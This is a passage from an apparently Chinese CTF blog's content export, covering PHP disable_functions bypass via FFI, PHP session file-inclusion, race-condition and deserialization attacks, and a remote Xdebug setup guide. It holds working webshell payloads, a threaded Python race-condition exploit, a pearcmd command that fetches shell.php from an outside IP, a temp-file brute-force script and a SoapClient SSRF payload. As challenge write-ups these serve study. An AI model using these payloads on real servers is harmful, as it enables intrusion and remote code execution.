d,posix_setsid,posix_setuid,posix_strerror,posix_times,posix_ttyname,posix_uname 直接不用看了，有一吨，肯定得绕过；蚁剑的各种插件都失败，得手动绕，ffi扩展开着\n看到这里ffi.enable=On，符合蚁剑插件的应用条件，写个webshell试试\n?fighter=create_function\u0026amp;fights=\u0026amp;invincibly=;}eval($_POST[wuhu]);/* what\u0026rsquo;s up，竟然没有回显\n尝试ping，发现还不出网，不能用curl外带flag\n那只能从FFI本身下手了，调用c的popen 用管道读命令执行的结果\nFILE *popen(const char* command,const char* type); popen会调用fork()产生子进程，然后从子进程中调用/bin/sh -c来执行参数的命令，type有r(read)和w(write)，依照这个值popen会建立管道连接到子进程的标准输出设备或写入到子进程的标准输入设备中\n?fighter=create_function\u0026amp;fights=\u0026amp;invincibly=;}$ffi = FFI::cdef(\u0026#34;void *popen(char*,char*);void pclose(void*);int fgetc(void*);\u0026#34;,\u0026#34;libc.so.6\u0026#34;);$o = $ffi-\u0026gt;popen(\u0026#34;ls / -lah\u0026#34;,\u0026#34;r\u0026#34;);$d = \u0026#34;\u0026#34;;while(($c = $ffi-\u0026gt;fgetc($o)) != -1){$d .= str_pad(strval(dechex($c)),2,\u0026#34;0\u0026#34;,0);}$ffi-\u0026gt;pclose($o);echo hex2bin($d);/* 另一种方法是调用php源码中的函数php_exec()，当它的参数type为3时对应调用的是passthru()函数，其执行命令可以将结果原始输出\n?fighter=create_function\u0026amp;fights=\u0026amp;invincibly=;}$ffi = FFI::cdef(\u0026#34;int php_exec(int type, char *cmd);\u0026#34;);$ffi-\u0026gt;php_exec(3,\u0026#34;ls /\u0026#34;);/* 但是，这道题在buu复现不了，原因是uuid有32个字符，加上连字符有36位，再加上flag{}有42位，但是/readflag程序只允许读出37个字符，所以最后的5位是读不出来的（辣个唯一解可能是爆破的 我试着爆了一会 加延时得跑好久好久好久 放弃了\n最近在刷buuoj，有望这个月内把50解以上的题做完捏\n以下是本文中涉及到的 和我学习时看过的所有文章的链接🔗 每日感谢互联网的丰富资源（ PHP RFC: Preloading | PHP RFC: FFI - Foreign Function Interface | PHP RFC: New custom object serialization mechanism | PHP FFI详解 - 一种全新的PHP扩展方式\nDo You Hate How Slow Python Is? This Is How You Can Make It Run Faster! | Make Python Faster with CFFI Python Bindings\nCFFI documentation | ctypes documentation\nPython cffi学习 | cffi-example: an example project showing how to use Python\u0026rsquo;s CFFI\nwp | wp2\n","date":"2021-12-03T00:01:07+08:00","permalink":"https://amiaaaz.github.io/2021/12/03/use-ffi-bypass-disable-functions/","section":"posts","tags":["PHP","unserialize","FFI","bypass_disable_functions"],"title":"FFI绕过disable_functions"},{"categories":["NOTES\u0026SUMMARY"],"contents":"提到session，能想到什么捏？文件上传，条件竞争，session包含，反序列化…… 让我们一点点说\nsession配置\u0026amp;简述 以7.4.3为例，php.ini中关于Session有几个默认项\nsession.auto_start = 0：默认不启动session，*但是可以在php脚本中手动执行session_start()\nsession.save_handler = files：session以文件形式存储\nsession.save_path=\u0026quot;\u0026quot;：session文件存储路径 文件名为sess_PHPSESSID\nlinux下默认存储位置；*可以被修改\n/var/lib/php/sess_PHPSESSID /var/lib/php/sessions/sess_PHPSESSID /var/lib/php5/sess_PHPSESSID /var/lib/php5/sessions/sess_PHPSESSID /tmp/sess_PHPSESSID /tmp/sessions/sess_PHPSESSID session.serialize_handler = php：session的默认序列化引擎是php\n其实一共有3种，*php和php_serialize这两种是很多题的元凶\n序列化引擎 存储方式 php 键名|序列化后字符串 php_binary 键名的长度对应的 ASCII 字符（会有不可显示的字符）+键名+经过 serialize() 函数反序列处理的值 php_serialize(php\u0026gt;=5.5.4) 将字符串反序列化处理得到的数组 session.upload_progress.enabled = On：当有POST上传行为时，此次上传的详细信息（如上传时间、上传进度等）都会被存储到session中\nsession.upload_progress.cleanup = On：当POST上传完成后，此次的session文件内容会被立即情况\nsession.upload_progress.prefix = \u0026quot;upload_progress_\u0026quot;：存入session文件中的前缀部分\nsession.upload_progress.name = \u0026quot;PHP_SESSION_UPLOAD_PROGRESS\u0026quot;：默认name，*可控可利用\nsession.use_strict_mode = 0：表示我们对Cookie中的PHPSESSID字段可控\n文件包含\u0026amp;条件竞争 默认情况下session.use_strict_mode = 0，当我们设置了Cookie的PHPSESSID字段后的值value后，php会自动创建session文件（默认路径/tmp/sess_PHPSESSID）；注意这个行为并不需要session.auto_start = On或是session_start()来手动开启就会被PHP自动初始化一个session，并将prefix+value写入sess_PHPSESSID文件中；整个流程中value可控，我们可以把恶意的payload加载到sess文件中然后包含，得到rce\n这是一个常见的上传表单\n\u0026lt;form action=\u0026#34;index.php\u0026#34; method=\u0026#34;POST\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;PHP_SESSION_UPLOAD_PROGRESS\u0026#34; value=\u0026#34;666666\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;file\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; 当然一般的题不会有这么单纯，还会配一个默认项session.upload_progress.cleanup = On；但是如果我们构造上传表单时传的无用文件很大时就可以来个顶级拉扯（条件竞争），在它被清空前先包含\u0026amp;rce\n[WMCTF2020]Make PHP Great Again 开幕源码暴击\n\u0026lt;?php highlight_file(__FILE__); require_once \u0026#39;flag.php\u0026#39;; if(isset($_GET[\u0026#39;file\u0026#39;])) { require_once $_GET[\u0026#39;file\u0026#39;]; } 这个题的非预期解：文件包含+条件竞争\nimport io import requests import threading sessid = \u0026#39;AMIZ\u0026#39; data = {\u0026#34;cmd\u0026#34;: \u0026#34;system(\u0026#39;tac /var/www/html/flag.php\u0026#39;);\u0026#34;} def write(session): while True: f = io.BytesIO(b\u0026#39;a\u0026#39; * 100 * 50) session.post(\u0026#39;http://d5ef2f36-5be3-46d5-8c04-301b9ba4f5f7.node4.buuoj.cn:81/\u0026#39;, data={\u0026#39;PHP_SESSION_UPLOAD_PROGRESS\u0026#39;: \u0026#39;\u0026lt;?php eval($_POST[\u0026#34;cmd\u0026#34;]);?\u0026gt;\u0026#39;}, files={\u0026#39;file\u0026#39;: (\u0026#39;amiz.txt\u0026#39;, f)}, cookies={\u0026#39;PHPSESSID\u0026#39;: sessid}) def read(session): while True: resp = session.post(\u0026#39;http://d5ef2f36-5be3-46d5-8c04-301b9ba4f5f7.node4.buuoj.cn:81/?file=/tmp/sess_\u0026#39;+sessid, data=data) if \u0026#39;amiz.txt\u0026#39; in resp.text: print(resp.text) event.clear() else: pass if __name__ == \u0026#34;__main__\u0026#34;: event = threading.Event() with requests.session() as session: for i in range(1, 30): threading.Thread(target=write, args=(session,)).start() for i in range(1, 30): threading.Thread(target=read, args=(session,)).start() event.set() [HXB 2021]easywill willphp v2.1.5，是基于tp的框架\n\u0026lt;?php namespace home\\controller; class IndexController{ public function index(){ highlight_file(__FILE__); assign($_GET[\u0026#39;name\u0026#39;],$_GET[\u0026#39;value\u0026#39;]); return view(); } } assign()可以控制name和value参数，而紧跟着的view函数有点东西\n可以看到最后的49行有文件写入的点，51行有个extract()可以做到变量覆盖，那我们就把file_put_contents的参数换成自己想要的\n/?name=cfile\u0026amp;value=/etc/passwd 可以正常回显\n不过flag文件的名字并不是flag，我们可以用pearcmd写shell的方法来个webshell（详细的可以参考我之前写过的另一个题-\u0026gt;[强网拟态 2021]Give_me_your_0day\n/?name=cfile\u0026amp;value=/../../../../usr/local/lib/php/pearcmd.php\u0026amp;+install+-R+/tmp+http://101.35.114.107:2301/shell.php 不过这里要注意shell的写法，常规的\u0026lt;?php eval($_POST['a']);?\u0026gt;这样的是不行的，下载就会报错\n执行也会报错，这里的shell要这样写\n\u0026lt;?php echo \u0026#39;\u0026lt;?php system(\u0026#34;ls /\u0026#34;);\u0026#39;?\u0026gt; 之后直接把value的值换成flag文件名即可\n/?name=cfile\u0026amp;value=/flag32897328937298hdwidh ————不过这里我直接写🐎一直成功不了，只能远程包含🐎\n————诶，说了半天，其实和本篇有关的在非预期的点，和上面的脚本几乎一样，要改的地方在于read部分的url了\n?name=cfile\u0026amp;value=/tmp/sess_\u0026#39;+sessid 反序列化 这里详细的讲解可以参照PHP中SESSION反序列化机制，就不做复制粘贴工程师了，用自己的话讲几个里面已经提过的点吧\n首先，这里的问题（我们可以攻击的原因）出现在两种序列化引擎混用的情况下，当提交\n?a=|O:8:\u0026#34;stdClass\u0026#34;:0:{} 时，php_serialize方式下会被存储为\na:1:{s:1:\u0026#34;a\u0026#34;;s:20:\u0026#34;|O:8:\u0026#34;stdClass\u0026#34;:0:{}\u0026#34;;} 但是被php方式则会解析为\na:1:{s:1:\u0026#34;a\u0026#34;;s:20:\u0026#34;=O:8:\u0026#34;stdClass\u0026#34;:0:{}\u0026#34;;} 在具体应用时，可控的点除了get/post的参数之外，还可以接着构造文件上传的表单，除了PHPSESSID之外的废物文件的文件名就可以当此大任，记得序列化字符前面要加上|，内部的双引号要用\\进行转义\n[HarekazeCTF2019]Easy Notes 这个题得审源码\n有添加note 导出note的功能，但是却不是常见的xss（因为是php写的嘛），会检测session中的admin是不是true\n我们的突破口在导出.zip这个功能上\n我们可以手动伪造一个session文件，之后将PHPSESSID设为生成的值即可，内容呢 就是admin=1\nxxxx|N;admin|b:1;xxxxxx 用xxxx|N;闭合前面脏数据，编辑到title中，将session的PHPSESSID设置好就可以getflag了\n[XCTF final 2018]bestphp 这里是docker环境（注意设置暴露端口 另外首页的index.php的submit要改一下\n这里有熟悉的call_user_func，来读一下admin.php的源码\n?function=extract\u0026amp;file=php://filter/convert.base64-encode/resource=admin.php hello admin \u0026lt;?php if(empty($_SESSION[\u0026#39;name\u0026#39;])){ session_start(); #echo \u0026#39;hello \u0026#39; + $_SESSION[\u0026#39;name\u0026#39;]; }else{ die(\u0026#39;you must login with admin\u0026#39;); } ?\u0026gt; 再读一下function.php，但是好像这俩都没啥用\n\u0026lt;?php function filters($data){ foreach($data as $key=\u0026gt;$value){ if(preg_match(\u0026#39;/eval|assert|exec|passthru|glob|system|popen/i\u0026#39;,$value)){ die(\u0026#39;Do not hack me!\u0026#39;); } } } ?\u0026gt; 很显然我们需要利用session包含，但是index.php中设置了open_basedir，默认的session路径是/var/lib/php/sessions/sess_phpsessid，不过有个方式可以更改session存储目录\n那我们就可以把shell写到web根目录下\n?function=session_start\u0026amp;save_path=. POST: name=\u0026lt;?php echo \u0026#34;aaa\u0026#34;;system($_GET[x]);?\u0026gt; 一般的一句话会没法正常工作（之前湖湘杯willphp也是这样，那个是\u0026lt;?php echo '\u0026lt;?php system(\u0026quot;ls /\u0026quot;);'?\u0026gt;\n?function=extract\u0026amp;file=/var/www/html/sess_qwer\u0026amp;x=ls ?function=extract\u0026amp;file=/var/www/html/sess_qwer\u0026amp;x=cat+fsadgsdagsadgasd.php 拿到flag\n解法2：php7.0 - LFI via SegmentFault 参考：LFI via SegmentFault\ninclude.php?file=php://filter/string.strip_tags/resource=/etc/passwd string.strip_tags可以导致php在执行过程中Segment Fault\n如果请求中同时存在一个上传文件的请求，这个文件会被保留，存储在/tmp/phpxxxxxxxxxxx（xxxxx是数字+字母的6位数），这个文件连续保存，不用竞争直接爆破（多线程上传文件，生成多个phpxxxxxxxxxxx）\n利用exp（打出来502是正常情况\nPOST /index.php?function=extract\u0026amp;file=php://filter/string.strip_tags/resource=function.php HTTP/1.1 Host: 101.35.114.107:20004 Content-Length: 1701 Cache-Control: max-age=0 Origin: null Upgrade-Insecure-Requests: 1 DNT: 1 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryeScXqSzdW2v22xyk User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7 Cookie: PHPSESSID=17qpuv1r8g19pm503593nddq10 Connection: close ------WebKitFormBoundaryeScXqSzdW2v22xyk Content-Disposition: form-data; name=\u0026#34;fileUpload\u0026#34;; filename=\u0026#34;test.jpg\u0026#34; Content-Type: image/jpeg \u0026lt;?php echo \u0026#34;wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww\u0026#34;;@eval($_POST[\u0026#39;cmd\u0026#39;]); ?\u0026gt; ------WebKitFormBoundaryeScXqSzdW2v22xyk-- 上帝视角看的话是这样\n用py脚本爆破出来(py2)\nimport requests import string charset = string.digits + string.letters host = \u0026#34;10.99.99.16\u0026#34; port = 80 base_url = \u0026#34;http://%s:%d\u0026#34; % (host, port) def brute_force_tmp_files(): for i in charset: for j in charset: for k in charset: for l in charset: for m in charset: for n in charset: filename = i + j + k + l + m + n url = \u0026#34;%s/index.php?function=extract\u0026amp;file=/tmp/php%s\u0026#34; % ( base_url, filename) print url try: response = requests.get(url) if \u0026#39;wwwwwwwwwwwwww\u0026#39; in response.content: print \u0026#34;[+] Include success!\u0026#34; return True except Exception as e: print e return False def main(): brute_force_tmp_files() if __name__ == \u0026#34;__main__\u0026#34;: main() 爆破成功后就拿到了shell，其余跟上面一样\n[LCTF 2018]bestphp\u0026rsquo;s revenge ————这个栗子结合了SoapClient和session的考点\n\u0026lt;?php highlight_file(__FILE__); $b = \u0026#39;implode\u0026#39;; call_user_func($_GET[f],$_POST); session_start(); if(isset($_GET[name])){ $_SESSION[name] = $_GET[name]; } var_dump($_SESSION); $a = array(reset($_SESSION),\u0026#39;welcome_to_the_lctf2018\u0026#39;); call_user_func($b,$a); 看到了我们的老朋友call_user_func，它会把第一个参数作为回调函数，其余参数作为回调函数的参数；如果我们第一个参数传入的是数组，它会把数组的第一个值作为类名，第二个值当作方法进行回调（反序列化中常见）；call_user_func函数不仅可以调用自定义函数和类，也可以调用php内置函数和内置类，比如extract\nflag.php可以直接访问（这里我没有扫 看wp知道的 robots.txt和页面源码都没有直接的提示）\n这个回显很明显需要ssrf，以localhost访问flag.php就会将flag写入SESSION中\n内置类SoapClient()满足这个需要，它可以通过反序列化来发起一个http请求（需要被调用__call\n所以整体思路是这样的：\n覆盖序列化引擎为php_serialize， 通过session_start将一个序列化的SoapClient写入session；由于get传入的name会被直接放入session中，所以序列化的字符串不用post传，只需要post传设置反序列化引擎的参数就可以 第一个call_user_func通过extract变量覆盖使$b = call_user_func，第二个call_user_func调用SoapClient-\u0026gt;__call（不可访问的方法 call_user_func） \u0026lt;?php $target=\u0026#39;http://127.0.0.1/flag.php\u0026#39;; $b = new SoapClient(null,array(\u0026#39;location\u0026#39; =\u0026gt; $target, \u0026#39;user_agent\u0026#39; =\u0026gt; \u0026#34;AAA:BBB\\r\\n\u0026#34; . \u0026#34;Cookie:PHPSESSID=gnnorfjmr9hr82gej7njt5dc83\u0026#34;, \u0026#39;uri\u0026#39; =\u0026gt; \u0026#34;http://127.0.0.1/\u0026#34;)); $se = serialize($b); echo \u0026#34;|\u0026#34;.urlencode($se); // O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A52%3A%22AAA%3ABBB%0D%0ACookie%3APHPSESSID%3Dgnnorfjmr9hr82gej7njt5dc83%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D /?name=|O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A52%3A%22AAA%3ABBB%0D%0ACookie%3APHPSESSID%3Dgnnorfjmr9hr82gej7njt5dc83%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D\u0026amp;f=session_start Cookie: PHPSESSID=gnnorfjmr9hr82gej7njt5dc83 POST: serialize_handler=php_serialize /?name=Soapclient\u0026amp;f=extract Cookie: PHPSESSID=gnnorfjmr9hr82gej7njt5dc83 POST: b=call_user_func 之后刷新页面就可以触发反序列化了，由于上面构造的时候cookie就是当前页面的cookie，所以整一套过程下来不需要单独改session，首页就可以看到结果\n[Jarvisoj web]PHPINFO 这里是题目页面；开幕源码\n\u0026lt;?php //A webshell is wait for you ini_set(\u0026#39;session.serialize_handler\u0026#39;, \u0026#39;php\u0026#39;); session_start(); class OowoO { public $mdzz; function __construct() { $this-\u0026gt;mdzz = \u0026#39;phpinfo();\u0026#39;; } function __destruct() { eval($this-\u0026gt;mdzz); } } if(isset($_GET[\u0026#39;phpinfo\u0026#39;])) { $m = new OowoO(); } else { highlight_string(file_get_contents(\u0026#39;index.php\u0026#39;)); } ?\u0026gt; 先看看phpinfo，应该有提示信息；发现session.upload_progress.enabled=On，这就非常好了，构造一个上传表单把我们想执行的代码序列化后设为文件名传入\n序列化exp\n\u0026lt;?php ini_set(\u0026#39;session.serialize_handler\u0026#39;, \u0026#39;php_serialize\u0026#39;); session_start(); \u0026lt;?php class OowoO { public $mdzz=\u0026#39;print_r(scandir(dirname(__FILE__)));\u0026#39;; } $obj = new OowoO(); echo \u0026#34;|\u0026#34;.serialize($obj); // |O:5:\u0026#34;OowoO\u0026#34;:1:{s:4:\u0026#34;mdzz\u0026#34;;s:36:\u0026#34;print_r(scandir(dirname(__FILE__)));\u0026#34;;} 构造上传表单，注意文件名的引号要加反斜杠转义\n|O:5:\\\u0026#34;OowoO\\\u0026#34;:1:{s:4:\\\u0026#34;mdzz\\\u0026#34;;s:36:\\\u0026#34;print_r(scandir(dirname(__FILE__)));\\\u0026#34;;} 然后访问这个php\npublic $mdzz=\u0026#39;print_r(file_get_contents(\u0026#34;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\u0026#34;));\u0026#39;; |O:5:\\\u0026#34;OowoO\\\u0026#34;:1:{s:4:\\\u0026#34;mdzz\\\u0026#34;;s:88:\\\u0026#34;print_r(file_get_contents(\\\u0026#34;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\\\u0026#34;));\\\u0026#34;;} 得到flag\n呼……长舒一口气，这个知识点终于画上了一个小句号；暑假总结php反序列化的时候就差整个和内置类，结果磨磨蹭蹭拖到今天，不过还是被我终结掉啦！文中还设计了一点SoapClient内置类的东西，由于篇幅原因不展开讲了= = 、\n最近的计划和安排就是刷题\u0026amp;把之前的知识体系填充完整，加油啦\n以下是本文中涉及到的 和我学习时看过的所有文章的链接 每日感谢互联网的丰富资源（ LCTF 2018 Writeup \u0026ndash; ROIS\nLFI via SegmentFault\nPHP中SESSION反序列化机制\n利用session.upload_progress进行文件包含和反序列化渗透\n如有遗漏请指正！！！\n","date":"2021-11-29T22:23:42+08:00","permalink":"https://amiaaaz.github.io/2021/11/29/php-session-study-notes/","section":"posts","tags":["PHP","PHP_Session","unserialize"],"title":"PHP_Session学习笔记"},{"categories":["LTS","环境配置"],"contents":"首先，这里的情况与一般的本地调试localhost不同，是本地debug远程主机的docke内的php项目，也就是这里的laravel；可能有的人觉得多此一举，直接在本地搭建项目、运行、debug一气呵成，速度还快，何必到远程跑一通？那我只能说too young，年轻人还是要有点长远的打算（\n一切的起因是我想复现cve-2021-3129，顺便亲自动手跟一跟\u0026amp;挖一挖laravel框架反序列化的链子，结果代码审计之前先被环境配置困住了；被这个糟心的调试从周二下午折磨到周四的凌晨，几乎是把能踩的坑踩了个遍（痛苦面具），直到现在的解决方案也不能算是最优解，不过是能正常稳定的跑起来了，次优解；感谢portainer让我能轻松创建docker\n把详细的步骤记录到这篇博客里，希望可以帮助到看到的人~欢迎友好交流！\n先说下本次配置的环境整体需求吧：\n远程vps的docker(FROM php:7.4-apache): 需开放web页面端口 + ssh端口（无需挂载目录 laravel 8.4.2, laravel/framework 8.22.1, facade/ignition 2.5.1 本地ide: PHPStorm + 一个映射到公网ip的供调试连接使用的端口（后面会解释原因） 除了最后的laravel之外就都是调php的通用流程啦，让我们开始吧~\n远程docker\u0026amp;laravel的环境搭建 以php:7.4-apache镜像作为基础进行创建，我这里用的是portainer（别问为什么不写dockerfile，问就是还在学着怎么写（一定不鸽 近期会更新到这里的\napt update apt-get install -y ssh git unzip vim /etc/ssh/sshd_config\t# 开启对应选项 比如允许root连接什么的 不用我细嗦 各位带手子们都应该懂 pecl install xdebug touch /var/log/php/xdebug_remote.log\t# 如果需要log的话要提前创建好噢 vim /usr/local/etc/php/php.ini\t# 将下面框中内容粘到末尾即可 [Xdebug] ; 这一项安装好之后会有提示 zend_extension=\u0026#34;/usr/local/lib/php/extensions/no-debug-non-zts-20190902/xdebug.so\u0026#34; xdebug.mode=debug xdebug.client_host=your_vps xdebug.client_port=port xdebug.idekey=laravel xdebug.remote_handler=\u0026#34;dbgp\u0026#34; xdebug.log=\u0026#34;/var/log/php/xdebug_remote.log\u0026#34; 此处安装版本为xdebug3，与xdebug2的配置语法有一些出入，具体更新的内容详见更新文档，安装好xdebug后执行php -v命令会有显示版本\nwget https://github.com/composer/composer/releases/download/2.1.12/composer.phar mv composer.phar /usr/local/bin/composer chmod +x /usr/local/bin/composer cd /var/www composer create-project laravel/laravel . \u0026#34;v8.4.2\u0026#34; vim composer.json\t# 修改内容见下 composer update mv public html chmod -R 777 /var/www \u0026#34;laravel/framework\u0026#34;: \u0026#34;8.22.1\u0026#34; \u0026#34;facade/ignition\u0026#34;: \u0026#34;2.5.1\u0026#34; 一个坑点：即使指定了laravel/laravel版本，composer创建默认会使用最新的laravel/framework版本\u0026amp;相关组件依赖（比如现在是8.73.2），由于我们需要复现的cve有特殊的laravel组件版本需求，，所以我们需要单独对composer.json进行修改，然后执行composer update进行更新\n一切顺利的话访问web页面就可以看到laravel啦\n与本地的PHPStorm连接起来进行debug 开始之前先自问自答一下：为什么调试要一个能映射到公网的端口？\nPHPStorm中集成了遵循DBGp协议的Xdebug插件，当开启监听时会监听本地指定端口，当访问指定server的web页面并带有含有ide_key的特定cookie参数之后，Xdebug会接收到这个参数并开启debug，通过DBGp协议向php.ini中指定的ip\u0026amp;port发送请求，当这个port指向我们ide在监听的端口时，就会建立起Xdebug和ide的连接（使用DBGp协议通讯），随后它们之间进行数据交互，如此反复；更详细的内容请参见-\u0026gt;6.3 IDE to debugger engine communications\n这下就好理解了叭？也就是说，需要一个与远程代码运行环境处在同一个网段下的端口（公网的更好）；接下来就是配置啦\n内网穿透 内网穿透我使用的是nps，配置过程可以参考官方文档，由于我这里配的比较早 这部分跳过\nPHPStorm的设置有一堆 把docker中/www目录打包拖下来，用PHPStorm打开\n设置Debug 20007是本地端口，被映射到公网ip\n这里的20007是公网端口，代理本地的20007\n如果我讲清楚前面原理的话，大家应该能理解这两个地方的端口设置二选一即可\n设置Deployment 用SFTP与docker进行ssh连接，文件映射\n设置远程php解释器 选择ssh模式，配一下账号密码端口就行（至于为什么不用docker/docker-compose，之后会说），这里的Path mappings直接就是Deployment中配好的，可以单独再加，但是没必要\n设置Server 注意高亮地方的设置，是web页面的端口，也要设置好本地的路径映射\n验证一下联通情况 好耶~\n浏览器插件Xdebug helper 设置Debug Configuration，选PHP Remote Debug模式\n安装插件，设置ide_key，开启小虫子\n终于完了 随便打个断点，开启本地监听\n刷新页面\n芜湖起飞！\n***待完善的地方 配置远程php解释器可以使用docker/docker-compose，这两个都需要单独挂载关键目录出来，配置上与ssh的区别还是有点大的，也需要注意docker-compose文件的编写，先扔一个参考资料-\u0026gt;Setting up PhpStorm with Xdebug for local development on Docker \u0026hellip; natively and via Deployment Configuration. 关于dockerfile/docker-compose文件的编写，我还不是很熟练，跟不用说这样的php项目了，同样先扔一个参考资料-\u0026gt;Structuring the Docker setup for PHP Projects \u0026hellip; folder structure, Dockerfile templates and general fundamentals PHPStorm有内置的docker管理功能，可以创建镜像-\u0026gt;配置debug一步到位 虽然踩了很多坑，但是也学到了不少东西，希望能多少帮助一些人少走弯路（\n限于篇幅原因，代码审计的部分就放到后面啦~\n最近更新的不太勤快，我先自我批评TAT，已经很菜了不能再不努力啊啊啊啊啊啊啊啊\n","date":"2021-11-25T18:44:34+08:00","permalink":"https://amiaaaz.github.io/2021/11/25/php-remote-debug-env-init/","section":"posts","tags":["debug","PHP"],"title":"PHP远程debug环境配置"},{"categories":["NOTES\u0026SUMMARY"],"contents":"之前做题总是会见到，但并不是很懂实际的原理，有点云里雾里的，好像懂了但又没有完全懂，是时候专门来学一下咯！\n没有什么新鲜的东西，只不过把师傅们已有的文章进行一个整合\u0026amp;重新整理，参考链接放到最后啦w\n前置知识 CGI/FastCGI CGI协议用于处理html这类静态文件之后出现的动态语言的解释器与webserver通信的问题，具体的实现有php-cgi\nCGI的弊端是令webserver每次处理请求时都会fork一个cgi进程，结束后再kill，比较浪费资源，FastCGI协议就解决了这个问题，处理完请求后不会kill而是保留该进程，使它可以一次处理多个请求，这样就不用每次fork了\n而php-fpm就是FastCGI协议的一个具体实现，作为FastCGI进程管理器（运行时有一个主进程和多个包含php解释器的worker进程来执行代码），用于接收webserver的请求\n查看phpinfo，Sever API处一般会有三种样式：\nApache 2.0 Handler CGI/FastCGI FPM/FastCGI 第一种把php作为apache的一个模块，相当于apache中的一个.dll或.so；第二种php-cgi.exe是一个独立的进程，web服务器也是独立的apache.exe，web服务器监听到http请求时会去调用php-cgi进程，之间通过cgi协议传递数据；而第三种fastcgi也是一种协议，它做了很多优化且常驻内存 不用每次都调用一下cgi，有辅助功能比如内存管理，垃圾处理由php-fpm来实现\n配置 php-fpm通信方式有tcp（本地监听9000端口）和unix socket套接字两种方式，题目中可以见到的都是tcp9000\napt update apt install nginx -y apt install software-properties-common -y apt install php7.4-fpm -y tcp模式 /etc/php/7.4/fpm/pool.d/www.conf\nlisten = 127.0.0.1:9000 /etc/nginx/sites-enabled/default\nserver{ ... location ~ \\.php$ { include snippets/fastcgi-php.conf; fastcgi_pass 127.0.0.1:9000; } ... } unix socket模式 如果启动fpm不做改动，默认为套接字模式\n/etc/php/7.4/fpm/pool.d/www.conf\nlisten = /run/php/php7.4-fpm.sock /etc/nginx/sites-enabled/default\nserver{ ... location ~ \\.php$ { include snippets/fastcgi-php.conf; fastcgi_pass unix:/run/php/php7.4-fpm.sock; } ... } 然后重启即可\nservice nginx start\t# reload /etc/init.d/php7.4-fpm start\t# restart 如果出现报错请查看对应日志\ncat /var/log/nginx/error.log cat /var/log/php7.4-fpm.log 漏洞成因 